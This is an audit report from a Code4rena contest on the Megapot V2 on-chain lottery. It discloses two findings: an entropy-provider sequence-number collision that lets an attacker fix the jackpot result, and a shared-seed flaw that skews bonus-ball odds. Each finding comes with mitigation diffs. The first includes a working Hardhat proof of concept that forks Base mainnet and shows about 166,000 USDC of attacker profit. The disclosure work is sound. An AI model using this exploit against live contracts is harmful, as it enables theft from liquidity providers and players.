# Audit Findings – Megapot V2

**Platform:** Code4rena  
**Contest:** [Megapot](https://code4rena.com/audits/2025-11-megapot)  
**Dates:** Nov 4, 2025 - Nov 14, 2025   
**Role:** Independent Security Researcher  
**Findings:** 2 Medium (1 solo)

---

## ⚠️ Medium Severity Findings

### M-01: Changes to Pyth entropy provider used by `ScaledEntropyProvider` allow attacker to fix jackpot result

#### Description and impact
When the `Jackpot` requests entropy from the `ScaledEntropyProvider` during `Jackpot::runJackpot`, the `ScaledEntropyProvider` tracks each request by the sequence number returned from the Pyth Network Entropy contract:

```solidity
    function requestAndCallbackScaledRandomness(
        uint32 _gasLimit,
        SetRequest[] memory _requests,
        bytes4 _selector,
        bytes memory _context
    )
        external
        payable
        returns (uint64 sequence)
    {
        // We assume that the caller has already checked that the fee is sufficient
        if (msg.value < getFee(_gasLimit)) revert InsufficientFee();
        if (_selector == bytes4(0)) revert InvalidSelector();
        _validateRequests(_requests);

        sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit);
        _storePendingRequest(sequence, _selector, _context, _requests);
    }

    // [...]

    function _storePendingRequest(
        uint64 sequence,
        bytes4 _selector,
        bytes memory _context,
        SetRequest[] memory _setRequests
    ) internal {
        pending[sequence].callback = msg.sender;
        pending[sequence].selector = _selector;
        pending[sequence].context = _context;
        for (uint256 i = 0; i < _setRequests.length; i++) {
            pending[sequence].setRequests.push(_setRequests[i]);
        }
    }
```

The `entropyProvider` storage variable used above is the Pyth entropy provider. For each Pyth entropy provider the sequence number is a unique value (incremented with each `requestV2` call). The problem is that different Pyth entropy providers may share the same sequence number at some point. We can see the sequence numbers are tracked per provider address by the Pyth Entropy contract [here](https://github.com/pyth-network/pyth-crosschain/blob/3bb18ac24944f5bd07142fb99991733b4bb88f46/target_chains/ethereum/contracts/contracts/entropy/EntropyState.sol#L36).

Consider this scenario:

1. Attacker observes from the mempool that the owner is about to call `ScaledEntropyProvider::setEntropyProvider` to change Pyth entropy provider to a new address.
1. Attacker front-runs the admin by calling `ScaledEntropyProvider::requestAndCallbackScaledRandomness` which registers their callback at `s`, the current sequence number. They provide _requests of length 2 where the first element specifies 5 samples with `minRange = 1` and `maxRange = 5` - without replacement (this will always produce the same selection of all numbers 1 to 5). The second element - for the bonus ball - can have minRange = maxRange = 1 so the result is always pre-determined to be 1. The attacker can use any account/contract with callback that reverts, there by in case `ScaledEntropyProvider::_entropyCallback` is executed for their callback, the storage value `pending[s]` is never cleared due to the revert on ScaledEntropyProvider.sol:253.
1. Admin's call to `ScaledEntropyProvider::setEntropyProvider` is executed. Let's assume the current sequence number of the new Pyth entropy provider is less than `s`.
1. Attacker buys one or more lottery tickets with numbers to match the desired outcome from step 2.
1. Attacker directly calls `Entropy::requestV2` for the new Pyth entropy provider until its sequence number reaches `s - 1`.
1. In the same transaction as the previous step, the attacker calls `Jackpot::runJackpot` which will cause `pending[s]` to be modified: callback, selector and context are over-written to the values required by the Jackpot. Requests will be appended onto the end of `pending[s].setRequests`, but the attacker's original requests are left as-is.
1. New Pyth entropy provider will call `Entropy::reveal` which causes `Jackpot::scaledEntropyCallback` to be executed and only the attacker's desired "random" numbers will be used (as they are at indices 0 and 1 in the `_randomNumbers` array).
1. Attacker will have the winning ticket and can claim their winnings.
Impact: attacker forces the outcome of the jackpot and claims the winning ticket at the expense of honest users and LPs.

Notes on attack feasibility:

If in the case the new entropy provider has higher sequence number that the old one, it is possible for the attacker to front run the admin change and directly call `Entropy::requestV2` several times for the old provider until its sequence number exceeds that of the new provider.

As at the time of writing this submission the sequence number for the default provider of the `Entropy` contract on Base mainnet is in the order of a few hundred thousand. If the difference between the old and new provider sequence numbers are at this order of magnitude, there by requiring the attacker call `Entropy::requestV2` about this many times, then this does incur a significant cost. However, if we consider the gas price of a layer 2 like Base and the potential earnings the attacker can make from the lottery win, the attack is still feasible. The attacker could split the calls up across different transactions/blocks as necessary. Additionally, if the new provider has lower sequence number than the old one, the attacker could just wait until the sequence number catches up due to normal use of the Pyth network.

Conclusion: any time the admin changes the Pyth entropy provider they put the protocol at significant risk of being exploited.

### Recommended mitigation steps
Consider changing the `ScaledEntropyProvider` to store requests based on sequence number and entropy provider. E.g. use a nested mapping:

```diff
--- a/contracts/ScaledEntropyProvider.sol
+++ b/contracts/ScaledEntropyProvider.sol
@@ -68,7 +68,7 @@ contract ScaledEntropyProvider is Ownable, IScaledEntropyProvider, IEntropyConsu
 
     IEntropyV2 private entropy;
     address private entropyProvider;
-    mapping(uint64 => PendingRequest) private pending;
+    mapping(address => mapping(uint64 => PendingRequest)) private pending;
```

### Proof of Concept
Change networks.hardhat config section in hardhat.config.ts to this:

```
hardhat: {
      chainId: 31337,
      allowUnlimitedContractSize: true,
      forking: {
        url: process.env.MAINNET_RPC_URL!, // make sure to set this env variable to Base mainnet
        blockNumber: 37973769, // block number I tested with
        enabled: true,
      },
      gasPrice: 1000000000
    }
```

Add a new file under contracts/interfaces called IEntropyV2Complete.sol with the below code:

```solidity
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.28;

import { IEntropyV2 } from "@pythnetwork/entropy-sdk-solidity/IEntropyV2.sol";

interface IEntropyV2Complete is IEntropyV2 {
     struct Request {
        // Storage slot 1 //
        address provider;
        uint64 sequenceNumber;
        // The number of hashes required to verify the provider revelation.
        uint32 numHashes;
        // Storage slot 2 //
        // The commitment is keccak256(userCommitment, providerCommitment). Storing the hash instead of both saves 20k gas by
        // eliminating 1 store.
        bytes32 commitment;
        // Storage slot 3 //
        // The number of the block where this request was created.
        // Note that we're using a uint64 such that we have an additional space for an address and other fields in
        // this storage slot. Although block.number returns a uint256, 64 bits should be plenty to index all of the
        // blocks ever generated.
        uint64 blockNumber;
        // The address that requested this random number.
        address requester;
        // If true, incorporate the blockhash of blockNumber into the generated random value.
        bool useBlockhash;
        // True if this is a request that expects a callback.
        bool isRequestWithCallback;
    }

    event RequestedWithCallback(
        address indexed provider,
        address indexed requestor,
        uint64 indexed sequenceNumber,
        bytes32 userRandomNumber,
        Request request
    );
    // Register msg.sender as a randomness provider. The arguments are the provider's configuration parameters
    // and initial commitment. Re-registering the same provider rotates the provider's commitment (and updates
    // the feeInWei).
    //
    // chainLength is the number of values in the hash chain *including* the commitment, that is, chainLength >= 1.
    function register(
        uint128 feeInWei,
        bytes32 commitment,
        bytes calldata commitmentMetadata,
        uint64 chainLength,
        bytes calldata uri
    ) external;

     function revealWithCallback(
        address provider,
        uint64 sequenceNumber,
        bytes32 userRandomNumber,
        bytes32 providerRevelation
    ) external;
}
Replace the contents of C4PoC.spec.ts with the below code:


import { ethers } from "hardhat";
import DeployHelper from "@utils/deploys";

import { getWaffleExpect, getAccounts } from "@utils/test/index";
import { ether, usdc } from "@utils/common";
import { Account } from "@utils/test";

import { PRECISE_UNIT } from "@utils/constants";
import { IEntropyV2Complete } from "../../typechain-types";

import {
  GuaranteedMinimumPayoutCalculator,
  Jackpot,
  JackpotBridgeManager,
  JackpotLPManager,
  JackpotTicketNFT,
  MockDepository,
  ReentrantUSDCMock,
  ScaledEntropyProvider,
  ScaledEntropyProviderMock,
} from "@utils/contracts";
import {
  Address,
  JackpotSystemFixture,
  RelayTxData,
  Ticket,
} from "@utils/types";
import { deployJackpotSystem } from "@utils/test/jackpotFixture";
import {
  calculatePackedTicket,
  calculateTicketId,
  generateClaimTicketSignature,
  generateClaimWinningsSignature,
} from "@utils/protocolUtils";
import { ADDRESS_ZERO } from "@utils/constants";
import {
  takeSnapshot,
  SnapshotRestorer,
  time,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { EventLog, keccak256, Log } from "ethers";

const expect = getWaffleExpect();

describe("C4", () => {
  let owner: Account;
  let buyerOne: Account;
  let buyerTwo: Account;
  let referrerOne: Account;
  let referrerTwo: Account;
  let referrerThree: Account;
  let solver: Account;

  let jackpotSystem: JackpotSystemFixture;
  let jackpot: Jackpot;
  let jackpotNFT: JackpotTicketNFT;
  let jackpotLPManager: JackpotLPManager;
  let payoutCalculator: GuaranteedMinimumPayoutCalculator;
  let usdcMock: ReentrantUSDCMock;
  let entropyProvider: ScaledEntropyProvider;
  let snapshot: SnapshotRestorer;
  let jackpotBridgeManager: JackpotBridgeManager;
  let mockDepository: MockDepository;
  let entropy: IEntropyV2Complete;
  let pythEntropyProvider: Account;
  let pythEntropyProvider2: Account;

  const providerContribution = ethers.encodeBytes32String("hello");
  const providerContribution2 = ethers.keccak256(providerContribution);

  beforeEach(async () => {
    [
      owner,
      buyerOne,
      buyerTwo,
      referrerOne,
      referrerTwo,
      referrerThree,
      solver,
      pythEntropyProvider,
      pythEntropyProvider2
    ] = await getAccounts();

    jackpotSystem = await deployJackpotSystem();
    jackpot = jackpotSystem.jackpot;
    jackpotNFT = jackpotSystem.jackpotNFT;
    jackpotLPManager = jackpotSystem.jackpotLPManager;
    payoutCalculator = jackpotSystem.payoutCalculator;
    usdcMock = jackpotSystem.usdcMock;

    // Give some USDC to the attacker
    await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(5000));
    await usdcMock
      .connect(buyerOne.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));

    entropy = await ethers.getContractAt(
      "IEntropyV2Complete",
      "0x6e7d74fa7d5c90fef9f0512987605a6d546181bb" // Pyth Entropy contract from Base mainnet
    );

    entropyProvider = await jackpotSystem.deployer.deployScaledEntropyProvider(
      await entropy.getAddress(),
      pythEntropyProvider.address
    );

    // Register different entropy providers for testing
    await entropy.connect(pythEntropyProvider.wallet).register(
      64,
      ethers.keccak256(providerContribution2),
      "0x00", // commitment metadata (not used)
      1024,
      "0x00" // uri (not used)
    );
    await entropy.connect(pythEntropyProvider2.wallet).register(
      64,
      ethers.keccak256(providerContribution2),
      "0x00", // commitment metadata (not used)
      1024,
      "0x00" // uri (not used)
    );

    // Setup the scenario such that the `pythEntropyProvider` currently used by the lottery system is at sequence number 2
    // (while `pythEntropyProvider2` - which the admin will switch to use later - is behind at sequence number 1)
    const initContrib = ethers.encodeBytes32String("test");
    const initFee = await entropy["getFeeV2(address,uint32)"](pythEntropyProvider.address, 0);
    await entropy.requestV2(pythEntropyProvider.address, keccak256(initContrib), 0, {value: initFee});
    const pythEntropyProviderInfo = await entropy.getProviderInfoV2(pythEntropyProvider.address);
    expect(pythEntropyProviderInfo.sequenceNumber).to.equal(2, "Should be at sequence number 2");
    const pythEntropyProviderInfo2 = await entropy.getProviderInfoV2(pythEntropyProvider2.address);
    expect(pythEntropyProviderInfo2.sequenceNumber).to.equal(1, "Should be at sequence number 1");

    await jackpot
      .connect(owner.wallet)
      .initialize(
        usdcMock.getAddress(),
        await jackpotLPManager.getAddress(),
        await jackpotNFT.getAddress(),
        entropyProvider.getAddress(),
        await payoutCalculator.getAddress(),
      );

    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000));

    await usdcMock
      .connect(owner.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));
    await jackpot.connect(owner.wallet).lpDeposit(usdc(1000000));

    await jackpot
      .connect(owner.wallet)
      .initializeJackpot(
        BigInt(await time.latest()) +
          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),
      );

    jackpotBridgeManager =
      await jackpotSystem.deployer.deployJackpotBridgeManager(
        await jackpot.getAddress(),
        await jackpotNFT.getAddress(),
        await usdcMock.getAddress(),
        "MegapotBridgeManager",
        "1.0.0",
      );

    mockDepository = await jackpotSystem.deployer.deployMockDepository(
      await usdcMock.getAddress(),
    );

    snapshot = await takeSnapshot();
  });

  beforeEach(async () => {
    await snapshot.restore();
  });

  describe("PoC", async () => {
    it("demonstrates the C4 submission's validity", async () => {
      // Attacker calls `requestAndCallbackScaledRandomness` such that the result is garantueed:
      // The first sample set will always be [1,2,3,4,5] and the second is always [1], regardless of the random number
      const setRequests = [
        {
          samples: 5,
          minRange: 1,
          maxRange: 5,
          withReplacement: false
        },
        {
          samples: 1,
          minRange: 1,
          maxRange: 1,
          withReplacement: false
        }
      ];
      const gasLimit = 100_000;
      const fee = await entropyProvider.getFee(gasLimit);
      await entropyProvider
        .connect(buyerOne.wallet)
        .requestAndCallbackScaledRandomness
        .staticCall(
          gasLimit,
          setRequests,
          "0x12345678",
          ethers.encodeBytes32String("context"),
          { value: fee }
      );

      // Attacker requests randomness which will use identical sequence number as that of a subsequent call to `jackpot.runJackpot`
      const requestRandomTx = await entropyProvider
        .connect(buyerOne.wallet)
        .requestAndCallbackScaledRandomness(
          gasLimit,
          setRequests,
          "0x12345678",
          ethers.encodeBytes32String("context"),
          { value: fee }
      );
      // Extract userContribution from the transaction logs
      const requestRandomReceipt = await requestRandomTx.wait();
      const eventSignature = entropy.interface.getEvent("RequestedWithCallback").topicHash;
      const event = requestRandomReceipt!.logs
        .filter((log): log is Log => log instanceof ethers.Log).find(
          (log) => log.topics[0] === eventSignature
        );
      const userContribution = entropy.interface.parseLog(event!)?.args[3];
      await entropyProvider
        .connect(owner.wallet)
        .setEntropyProvider(pythEntropyProvider2.address);

      // Attacker advances the sequence number of `pythEntropyProvider2`, so that after the system switches to use this provider,
      // the sequence number will match
      const initFee = await entropy["getFeeV2(address,uint32)"](pythEntropyProvider2.address, 0);
      await entropy
        .connect(buyerOne.wallet)
        .requestV2(pythEntropyProvider2.address, keccak256(ethers.encodeBytes32String("test")), 0, {value: initFee});

      // Attacker buys several of the winning ticket
      await jackpot.connect(buyerOne.wallet).buyTickets(
        Array(10).fill({normals: [1, 2, 3, 4, 5], bonusball: 1}),
        buyerOne.address,
        [],
        [],
        ethers.encodeBytes32String("source")
      );
      const userTicketIds = (await jackpotNFT.getUserTickets(buyerOne.address, 1)).map(t => t.ticketId);

      await time.increase(jackpotSystem.deploymentParams.drawingDurationInSeconds + BigInt(1));

      const entropyFee: bigint = ether(0.00005);
      const entropyBaseGasLimit: bigint = BigInt(1000000);
      const entropyVariableGasLimit: bigint = BigInt(250000);
      const drawingState = await jackpot.getDrawingState(1);
      await jackpot
        .connect(buyerOne.wallet)
        .runJackpot({value: entropyFee + ((entropyBaseGasLimit + entropyVariableGasLimit * drawingState.bonusballMax) * BigInt(1e7))});

      // Entropy provider gives the random number
      await entropy.connect(pythEntropyProvider.wallet).revealWithCallback(
        pythEntropyProvider.address,
        2,
        userContribution,
        providerContribution
      );

      const userInitUSDCBal = await usdcMock.balanceOf(buyerOne.address);
      await jackpot.connect(buyerOne.wallet).claimWinnings(userTicketIds);
      const finalUSDCBal = await usdcMock.balanceOf(buyerOne.address);
      console.log("Balance change: ", finalUSDCBal - userInitUSDCBal);
    }).timeout(60 * 15 * 1000);
  });
});
```

The test logs indicate the attacker makes about 166,000 USDC profit in this example.

**Submission details:** https://code4rena.com/reports/2025-11-megapot#m-06-changes-to-pyth-entropy-provider-used-by-scaledentropyprovider-allow-attacker-to-fix-jackpot-result

## M-02: If bonus ball max equals normal ball max then ticket buyers gain excessive edge

### Finding description and impact

The random number selection is generated using a common `seed` for both the normal balls and the bonus ball. It is possible that `normalBallMax` is equal to `bonusBallMax` because `bonusBallMax` is calculated using this formula below (abbreviated version of [Jackpot.sol:1494-1496](https://github.com/code-423n4/2025-11-megapot/blob/f0a7297d59c376e38b287b2c56740617dbbfbdc7/contracts/Jackpot.sol#L1494-L1496)):

```
newBonusball = max(
  bonusBallMin,
  (prizePool / (1 - lpEdgeTarget)) / choose(normalBallMax, 5)
)
```

If `prizePool` is increased sufficiently then it's possible for the above formula to reach `normalBallMax`. The sponsor indicated via [Q&A](https://code4rena.com/audits/2025-11-megapot/inbox/56) that the typical starting range for `normalBallMax` is 30 to 35 and it may be increased/decreased depending on pool size. Therefore under normal circumstances, if the admin is always monitoring the pool size, then it would be rare (although not impossible) for `prizePool` to increase enough such that `normalBallMax` becomes equal to `bonusBallMax`. We can't discount this possibility as there is nothing to garantuee the admin is constantly monitoring the situation.

Secondly, there is another way in which the prize pool could be forcibly increased by an attacker: they could deliberately buy many of the same ticket (likely to have minimal winnings) which will add to the new LP value during the `scaledEntropyCallback`:

```solidity
    function scaledEntropyCallback(
        bytes32,
        uint256[][] memory _randomNumbers,
        bytes memory
    )
        external
        nonReentrant
        onlyEntropy
    {
        // [...]
        (
            uint256 newLpValue,
            uint256 newAccumulatorValue
        ) = jackpotLPManager.processDrawingSettlement(
            currentDrawingId,
            currentDrawingState.lpEarnings,
            drawingUserWinnings,
            protocolFeeAmount
        );

        _setNewDrawingState(newLpValue, currentDrawingState.drawingTime + drawingDurationInSeconds);

        // [...]
    }

    function _setNewDrawingState(uint256 _newLpValue, uint256 _nextDrawingTime) internal {
        // [ ... ]

        uint256 combosPerBonusball = Combinations.choose(normalBallMax, NORMAL_BALL_COUNT);
        uint256 minNumberTickets = newPrizePool * PRECISE_UNIT / ((PRECISE_UNIT - lpEdgeTarget) * ticketPrice);
        uint8 newBonusball = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball)));
        newDrawingState.bonusballMax = newBonusball;
        
        TicketComboTracker.init(drawingEntries[currentDrawingId], normalBallMax, newBonusball, NORMAL_BALL_COUNT);

        // [ ... ]
    }
```

Again, the admin could in theory increase the `normalBallMax` prior to `scaledEntropyCallback` being called, and this would prevent the undesired situation where `normalBallMax = bonusBallMax`. However, it seems very unlikely they would be closely monitoring the actual tickets bought to figure the expected payout for LPs in order to prevent this from occurring. The attacker will obviously incur significant cost in doing this but as shown below they gain a large statistical advantage from which a profit could potentially be made during the next drawing.

In this situation where `normalBallMax = bonusBallMax = N`, the selection process in `FisherYatesRejection.draw` will always produce the same shuffle of the numbers in `pool` (the set from 1 to `N`):

```solidity
    function draw(
        uint256 minRange,
        uint256 maxRange,
        uint256 count,
        uint256 seed
    ) external pure returns (uint256[] memory result) {
        require(count <= maxRange - minRange + 1, "Too many draws");

        // Build pool [1, 2, ..., range]
        uint256 rangeSize = maxRange - minRange + 1;
        uint256[] memory pool = new uint256[](rangeSize);
        for (uint256 i = 0; i < rangeSize; i++) {
            pool[i] = i + minRange;
        }

        uint256 nonce = 0;

        // Fisher-Yates shuffle with rejection sampling
        for (uint256 i = rangeSize - 1; i > 0; i--) {
            uint256 rand;
            while (true) {
                rand = uint256(keccak256(abi.encode(seed, nonce)));
                uint256 limit = (MAX_UINT / (i + 1)) * (i + 1);

                if (rand < limit) {
                    rand = rand % (i + 1);
                    break;
                }
                nonce++;
            }

            // Swap pool[i] and pool[rand]
            (pool[i], pool[rand]) = (pool[rand], pool[i]);
            nonce++;
        }

        // Take first `count` numbers
        result = new uint256[](count);
        for (uint256 j = 0; j < count; j++) {
            result[j] = pool[j];
        }
    }
```

The only difference in arguments to this function for the two draws is that for the normal balls the first 5 elements of `pool` are returned whereas for the bonus ball only the first element is returned. Therefore in this case a gambler knows that for any draw the bonus ball will be contained within the normal ball set.

This issues gives a statistical advantage for the gambler at the expense of LPs. Let's denote the probability of the gambler correctly guessing `k` out of the 5 normal balls as `P(k)`. This is unchanged by the advantage compared to normal conditions. However, the probability of them getting a bonus ball match is higher. Normally this probability should be `P(k) * (1/N)`, as there should be an independent, 1 in N chance of getting the bonus ball. By always using one of their 5 normal ball picks as the bonus ball pick, the gambler increased the chance of a bonus ball match to:

```
P(k) * (k/5) * (1/5) = P(k) * k / 25
```

This is because they have a `k` in 5 chance of selecting the bonus ball within their set of `k` correct guesses, and then a 1 in 5 chance of picking the right one as the bonus ball out of the 5 normal they've chosen.

Their probability of bonus ball match therefore goes up by a factor of `k * N / 25` for each tier level `k`. Plugging in the numbers when `N = 30`, we get:

| k | Factor by which chance of bonus ball match increases |
|---|------------------------------------------------------|
| 1 | 1.2 |
| 2 | 2.4 |
| 3 | 3.6 |
| 4 | 4.8 |
| 5 | 6 |

Conclusion: the gambler gets significant statistical advantage. It is very possible that their expected value is positive from playing the game. Impact: financial loss to LPs.

### Recommended mitigation steps

Consider providing separate random seeds in each draw done within `ScaledEntropyProvider`:

```diff
--- a/contracts/ScaledEntropyProvider.sol
+++ b/contracts/ScaledEntropyProvider.sol
@@ -258,54 +258,55 @@ contract ScaledEntropyProvider is Ownable, IScaledEntropyProvider, IEntropyConsu
 
     function _getScaledRandomness(
         bytes32 _randomNumber,
         SetRequest[] memory _setRequests
     )
         internal
         pure
         returns (uint256[][] memory requestsOutputs)
     {
         requestsOutputs = new uint256[][](_setRequests.length);
         
         for (uint256 i = 0; i < _setRequests.length; i++) {
             if (!_setRequests[i].withReplacement) {
                 requestsOutputs[i] = FisherYatesRejection.draw(
                     _setRequests[i].minRange,
                     _setRequests[i].maxRange,
                     _setRequests[i].samples,
                     uint256(_randomNumber)
                 );
             } else {
                 requestsOutputs[i] = _drawWithReplacement(
                     _setRequests[i].minRange,
                     _setRequests[i].maxRange,
                     _setRequests[i].samples,
                     uint256(_randomNumber)
                 );
             }
+            _randomNumber = keccak256(abi.encode(_randomNumber));
         }
     }
```

**Submission details:** https://code4rena.com/audits/2025-11-megapot/submissions?uid=BMJqDwhamAw
